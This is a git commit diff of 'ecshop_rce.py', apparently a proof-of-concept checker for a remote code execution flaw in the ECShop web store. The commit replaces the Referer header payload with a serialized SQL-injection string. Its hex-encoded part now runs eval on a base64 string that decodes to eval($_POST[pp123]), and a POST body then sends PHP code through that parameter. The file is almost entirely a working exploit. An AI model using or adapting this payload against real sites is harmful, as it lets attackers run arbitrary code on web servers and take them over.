23c04e4dce72a614b47672ab8c5a25066e063b96
myh0st <1293348082@qq.com>
2023-09-20 16:11:19 +0800

    Update ecshop_rce.py

--- ecshop_rce.py
+++ ecshop_rce.py
@@ -6,12 +6,13 @@ import re
 
 urllib3.disable_warnings()
 
-
 headers = {
     'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36',
     'Content-Type' : 'application/x-www-form-urlencoded',
-    'Referer': '554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:107:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1\' UNION/*";}554fcae493e564ee0dc75bdf2ebf94ca'
+    'Referer': '554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:193:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b6576616c09286261736536345f6465636f64650928275a585a686243676b5831425055315262634841784d6a4e644b54733d2729293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1\' UNION/*";}554fcae493e564ee0dc75bdf2ebf94ca'
 }
+data = "action=login&pp123=phpinfo();"
+
 
 regular = "(PHP Version [0-9\.]+)"
 
@@ -20,7 +21,7 @@ def verify(url):
         """
         检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
         """
-        req = requests.get(url, headers = headers, timeout = 20, verify = False)
+        req = requests.post(url, headers = headers, data=data, timeout = 20, verify = False)
         info = re.findall(regular, req.text)
         if len(info) != 0:
             return info[0]
